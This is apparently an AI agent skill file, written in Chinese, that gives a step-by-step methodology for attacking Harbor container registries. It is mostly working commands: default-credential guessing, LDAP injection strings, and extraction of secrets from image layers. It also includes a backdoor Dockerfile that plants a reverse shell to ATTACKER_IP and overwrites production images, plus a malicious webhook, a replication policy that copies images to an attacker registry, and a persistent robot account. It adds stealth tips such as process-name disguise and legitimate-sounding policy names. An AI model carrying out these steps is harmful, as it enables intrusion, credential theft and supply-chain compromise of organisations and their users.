---
name: harbor-tactics
description: "Harbor 容器镜像仓库攻击。当发现目标运行 Harbor 实例、默认凭据 admin/Harbor12345 未修改、Harbor API 暴露、或需要从 Harbor 窃取镜像或注入后门时使用。覆盖未授权访问与公开仓库枚举、默认凭据攻击、镜像后门注入（供应链攻击）、Webhook 滥用、复制策略利用（跨仓库数据窃取）、镜像扫描绕过"
metadata:
  tags: "harbor,container-registry,镜像仓库,docker-registry,admin,Harbor12345,webhook,replication,供应链攻击,镜像后门"
  category: "postexploit"
---

# Harbor 容器镜像仓库渗透测试与利用方法论

Harbor 是企业级私有容器镜像仓库——提供镜像托管、漏洞扫描、签名验证、复制策略、Robot Account 等功能。默认管理员账户 `admin/Harbor12345` 在大量部署中未被修改，一旦获取管理员权限，攻击者可枚举并拉取所有项目镜像、从镜像层中提取硬编码凭据（环境变量/配置文件/私钥）、注入后门镜像实施供应链攻击、创建 Webhook 进行事件监控与数据外传、利用复制策略将镜像窃取到攻击者控制的 Registry、创建 Robot Account 实现持久化访问。

## 深入参考

识别到具体攻击路径后，加载参考文档获取完整命令与利用 Payload：

- API 调用、镜像分析、注入模板、Webhook/复制策略配置 → 读 [references/attack-techniques.md](references/attack-techniques.md)

## Phase 1: 服务发现与版本识别

### 1.1 实例识别

Harbor 的默认端口和指纹：

| 组件 | 默认端口 | 识别特征 |
|---|---|---|
| Web UI / API | 80 / 443 | `/api/v2.0/systeminfo` 返回版本、`/harbor/sign-in` 登录页 |
| Docker Registry API | 443 / 5000 | `/v2/` 返回 `{}` 或 401、`Docker-Distribution-API-Version` 响应头 |
| Notary（镜像签名） | 4443 | TLS，Notary Server API |
| Trivy（漏洞扫描） | 内部 | 通过 Harbor API 间接调用 |

```bash
# 指纹探测
curl -sk https://TARGET/api/v2.0/systeminfo | jq .
# 返回示例: {"with_notary":true,"with_trivy":true,"harbor_version":"v2.x.x",...}

# Docker Registry API 探测
curl -sk https://TARGET/v2/
# 返回 {} 或 401 Unauthorized（确认是 Docker Registry）

# 首页探测
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/harbor/sign-in
# 200 = Harbor Web UI
```

### 1.2 版本与功能检测

版本信息决定可用的攻击面：

| 版本范围 | 关键特性 | 安全影响 |
|---|---|---|
| v1.x | 旧版 API (`/api/`)、ChartMuseum | 部分 API 无需认证 |
| v2.0-v2.4 | 新 API (`/api/v2.0/`)、Robot Account v1 | Robot Account 权限粗粒度 |
| v2.5+ | Robot Account v2、Cosign 签名 | 细粒度权限但配置复杂 |
| v2.8+ | OIDC 组映射、Proxy Cache | Proxy Cache 可能泄露上游凭据 |

## Phase 2: 认证检测与凭据获取

### 2.1 默认凭据测试

```bash
# 默认管理员凭据（大量部署未修改）
curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/users/current | jq .

# 常见弱密码
for pass in Harbor12345 harbor admin Admin123 password; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -u "admin:$pass" https://TARGET/api/v2.0/users/current)
  echo "admin:$pass -> $CODE"
done
```

### 2.2 API Token 与 Docker Login

```bash
# Docker CLI 登录（成功后凭据缓存在 ~/.docker/config.json）
docker login TARGET -u admin -p Harbor12345

# 获取 Bearer Token（用于 Registry API）
curl -sk "https://TARGET/service/token?service=harbor-registry&scope=registry:catalog:*" \
  -u admin:Harbor12345 | jq -r '.token'

# 使用 Basic Auth 直接调用 API
HARBOR_AUTH=$(echo -n 'admin:Harbor12345' | base64)
curl -sk -H "Authorization: Basic $HARBOR_AUTH" https://TARGET/api/v2.0/projects
```

### 2.3 LDAP/OIDC 认证绕过

Harbor 支持 LDAP/OIDC 外部认证。如果 LDAP 匿名绑定开启或 OIDC 配置不当，可能绕过认证：

```bash
# 检查认证模式
curl -sk https://TARGET/api/v2.0/systeminfo | jq '.auth_mode'
# "db_auth" = 本地数据库, "ldap_auth" = LDAP, "oidc_auth" = OIDC

# LDAP 认证模式下，尝试 LDAP 注入
# username: *)(objectClass=* 或 admin)(&
```

## Phase 3: 攻击决策树

```
发现 Harbor 实例
├── 未认证
│   ├── /api/v2.0/systeminfo → 确认版本与功能
│   ├── /api/v2.0/projects → 公开项目枚举（project_public=true）
│   ├── /v2/_catalog → Registry API 镜像目录（可能无需认证）
│   ├── 默认凭据 admin/Harbor12345 → 尝试登录
│   └── 无法登录 → 搜索泄露的 ~/.docker/config.json / Harbor Token
│
├── 已认证（管理员权限）
│   ├── 项目与镜像枚举 → Phase 4
│   │   ├── 所有项目列表 → 私有项目暴露
│   │   ├── 镜像列表 → 拉取分析（凭据提取）
│   │   └── Artifact 标签 → 识别生产/敏感镜像
│   │
│   ├── 镜像拉取与凭据提取 → Phase 5
│   │   ├── docker pull → 本地分析镜像层
│   │   ├── 环境变量 → API Key/数据库密码
│   │   ├── 配置文件 → .env / config.yaml / application.properties
│   │   └── 私钥/证书 → SSH Key / TLS 证书
│   │
│   ├── 有 push 权限？
│   │   └── 是 → 镜像后门注入（供应链攻击）→ Phase 6
│   │
│   ├── 管理员功能
│   │   ├── Webhook 创建 → 事件监控/数据外传 → Phase 7
│   │   ├── 复制策略 → 窃取镜像到攻击者 Registry → Phase 8
│   │   ├── Robot Account → 持久化访问 → Phase 9
│   │   └── 漏洞扫描报告 → 已知漏洞情报 → Phase 10
│   │
│   └── 用户管理 → 创建后门账户 / 提权
│
└── 已认证（普通用户）
    ├── 可见项目枚举 → 镜像拉取与分析
    ├── 项目成员列表 → 识别高权限用户
    └── 尝试提权 → 项目管理员 → 系统管理员
```

## Phase 4: 项目与镜像枚举

### 4.1 项目枚举

```bash
# 列出所有项目（需要认证或仅返回公开项目）
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects?page_size=100" | jq '.[].name'

# 项目详细信息（成员数、镜像数、存储配额）
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects?page_size=100" | \
  jq '.[] | {name, repo_count, metadata}'
```

### 4.2 镜像仓库枚举

```bash
# 指定项目的所有仓库
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/repositories?page_size=100" | \
  jq '.[].name'

# Artifact（标签）列表
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/repositories/REPO_NAME/artifacts" | \
  jq '.[] | {digest: .digest, tags: [.tags[]?.name], size: .size}'
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取批量枚举脚本

## Phase 5: 镜像拉取与凭据提取

镜像是最高价值的攻击目标——开发者经常在镜像中硬编码凭据、API Key、数据库连接字符串。

### 5.1 镜像拉取

```bash
# Docker CLI 拉取
docker pull TARGET/PROJECT_NAME/IMAGE:TAG

# 使用 skopeo 拉取（无需 Docker daemon）
skopeo copy --src-tls-verify=false \
  docker://TARGET/PROJECT_NAME/IMAGE:TAG \
  dir:./image-export/

# 使用 crane 拉取
crane pull --insecure TARGET/PROJECT_NAME/IMAGE:TAG image.tar
```

### 5.2 镜像分析与凭据提取

```bash
# 查看镜像历史（暴露构建时的 ENV/ARG/COPY 操作）
docker history TARGET/PROJECT_NAME/IMAGE:TAG --no-trunc

# 使用 dive 逐层分析
dive TARGET/PROJECT_NAME/IMAGE:TAG

# 导出镜像文件系统
docker save TARGET/PROJECT_NAME/IMAGE:TAG -o image.tar
mkdir image-layers && tar xf image.tar -C image-layers/
```

高价值搜索目标：

| 文件/路径 | 可能包含的凭据 |
|---|---|
| `/app/.env` / `/.env` | 数据库密码、API Key、Secret |
| `/app/config.*` / `/etc/app/` | 应用配置（连接字符串） |
| `~/.ssh/id_rsa` | SSH 私钥 |
| `~/.aws/credentials` | AWS AK/SK |
| `/run/secrets/*` | Docker Secrets |
| `ENV` 指令 | 环境变量中的凭据 |

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取自动化凭据搜索脚本

## Phase 6: 镜像后门注入（供应链攻击）

如果拥有 push 权限，可以篡改镜像植入后门：

### 6.1 攻击流程

```
拉取目标镜像 → 添加恶意层 → 重新打标签 → 推送覆盖原镜像
```

```bash
# 拉取原始镜像
docker pull TARGET/PROJECT/IMAGE:latest

# 创建后门 Dockerfile
cat > Dockerfile.inject <<'DEOF'
FROM TARGET/PROJECT/IMAGE:latest
# 注入反弹 Shell 到启动脚本
RUN echo '#!/bin/sh' > /tmp/.init && \
    echo 'nohup sh -c "while true; do sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1; sleep 60; done" &' >> /tmp/.init && \
    chmod +x /tmp/.init
# 修改 entrypoint 先执行后门
COPY --from=0 / /
ENTRYPOINT ["/bin/sh", "-c", "/tmp/.init; exec $0 $@"]
DEOF

# 构建并推送（覆盖原标签）
docker build -f Dockerfile.inject -t TARGET/PROJECT/IMAGE:latest .
docker push TARGET/PROJECT/IMAGE:latest
```

### 6.2 隐蔽注入技巧

- 使用多阶段构建减小额外层的大小差异
- 后门进程名伪装为合法进程（如 `[kworker/0:1]`）
- 使用已存在的基础镜像 layer 避免新增可疑层
- 保持原始 ENTRYPOINT/CMD 不变，通过 `LD_PRELOAD` 或 init 脚本注入

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整后门 Dockerfile 模板

## Phase 7: Webhook 滥用

Harbor Webhook 可以在镜像推送/拉取/删除等事件时通知外部服务——攻击者可利用此机制监控仓库活动或外传数据。

### 7.1 Webhook 枚举与创建

```bash
# 列出项目的 Webhook
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies" | jq .

# 创建恶意 Webhook（监听所有事件）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies" \
  -d '{
    "name": "audit-integration",
    "targets": [{
      "type": "http",
      "address": "https://ATTACKER_SERVER/harbor-hook",
      "skip_cert_verify": true
    }],
    "event_types": [
      "PUSH_ARTIFACT", "PULL_ARTIFACT", "DELETE_ARTIFACT",
      "SCANNING_COMPLETED", "TAG_RETENTION"
    ],
    "enabled": true
  }'
```

Webhook 通知中包含项目名、仓库名、镜像标签、操作者用户名——可用于：
- 监控哪些镜像被频繁拉取（识别生产镜像）
- 监控新推送的镜像（窃取最新构建产物）
- 收集操作者用户名（用于后续凭据攻击）

## Phase 8: 复制策略利用

Harbor 复制策略可以自动将镜像同步到远程 Registry——攻击者可创建复制策略将所有镜像窃取到自己控制的 Registry。

### 8.1 枚举现有复制策略

```bash
# 列出复制策略
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/replication/policies" | jq .

# 列出远程 Registry 端点
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/registries" | jq '.[] | {id, name, url, credential}'
```

### 8.2 创建窃取策略

```bash
# 先注册攻击者 Registry 端点
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/registries" \
  -d '{
    "name": "backup-registry",
    "url": "https://ATTACKER_REGISTRY",
    "credential": {"type": "basic", "access_key": "USER", "access_secret": "PASS"},
    "insecure": true,
    "type": "docker-hub"
  }'

# 创建复制策略（推送模式，所有镜像）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/replication/policies" \
  -d '{
    "name": "disaster-recovery-sync",
    "src_registry": null,
    "dest_registry": {"id": REGISTRY_ID},
    "trigger": {"type": "manual"},
    "filters": [],
    "enabled": true,
    "override": true
  }'
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取自动触发与增量窃取配置

## Phase 9: Robot Account 持久化

Robot Account 是 Harbor 的服务账户机制——攻击者可创建 Robot Account 实现无需用户密码的持久化访问。

### 9.1 Robot Account 管理

```bash
# 列出系统级 Robot Account
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/robots" | jq '.[] | {id, name, level, expires_at}'

# 列出项目级 Robot Account
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/robots" | jq .

# 创建系统级 Robot Account（全项目 pull/push 权限）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/robots" \
  -d '{
    "name": "ci-scanner",
    "duration": -1,
    "level": "system",
    "permissions": [{
      "kind": "project",
      "namespace": "*",
      "access": [
        {"resource": "repository", "action": "pull"},
        {"resource": "repository", "action": "push"}
      ]
    }]
  }'
# 响应中的 secret 是一次性显示的密码，务必保存
```

## Phase 10: 漏洞扫描报告窃取

Harbor 内置 Trivy 漏洞扫描——扫描报告可用于识别目标环境中存在已知漏洞的镜像。

```bash
# 获取 Artifact 的漏洞报告
curl -sk -u admin:Harbor12345 \
  -H "X-Accept-Vulnerabilities: application/vnd.security.vulnerability.report; version=1.1" \
  "https://TARGET/api/v2.0/projects/PROJECT/repositories/REPO/artifacts/TAG/additions/vulnerabilities" | \
  jq '.. | .vulnerabilities? // empty | .[] | {id, severity, package, version, fix_version}'

# 筛选 Critical/High 漏洞（可用于后续漏洞利用）
# 关注: CVE 编号、受影响包名、修复版本
```

漏洞报告价值：
- 识别运行中镜像的已知 CVE → 直接利用
- 了解目标补丁策略（多久未修复 → 安全管理成熟度）
- 定位含有特定漏洞的基础镜像（如 Log4j → 所有使用该基础镜像的服务受影响）

## 工具速查

| 工具 | 用途 | 关键命令 |
|---|---|---|
| `curl` + Harbor API | REST API 调用 | `/api/v2.0/projects`、`/api/v2.0/robots` |
| `docker` CLI | 镜像拉取/推送/分析 | `docker pull/push/history/save` |
| `skopeo` | 无 daemon 镜像操作 | `skopeo copy/inspect/list-tags` |
| `crane` | 轻量 Registry 工具 | `crane pull/push/ls/digest` |
| `dive` | 镜像层分析 | `dive IMAGE` 逐层查看文件变更 |
| `trivy` | 本地漏洞扫描 | `trivy image IMAGE` |
| `jq` | JSON 解析 | 解析 API 响应 |

## 注意事项

- **审计日志**：Harbor 记录所有 API 调用、镜像拉取/推送、用户登录操作；管理员可在 "Logs" 页面查看所有审计事件
- **默认凭据**：`admin/Harbor12345` 是安装时设置的默认密码，许多生产环境未修改；修改后原密码不可恢复
- **镜像签名**：如果启用了 Cosign/Notary 签名验证，篡改后的镜像可能被拒绝部署——需同时伪造签名或禁用验证策略
- **配额限制**：Harbor 支持项目级存储配额，大量拉取/推送可能触发配额告警
- **复制策略**：创建的复制策略和 Registry 端点对所有管理员可见——命名应伪装为合法的灾备/同步策略
- **Robot Account**：系统级 Robot Account 对所有管理员可见；项目级仅项目管理员可见——持久化时优先使用项目级
- **Proxy Cache**：v2.8+ 的 Proxy Cache 项目可能缓存上游 Registry 的认证凭据——值得检查
- **Garbage Collection**：Harbor GC 会清理未被标签引用的层——被覆盖的原始镜像可能在 GC 后永久丢失
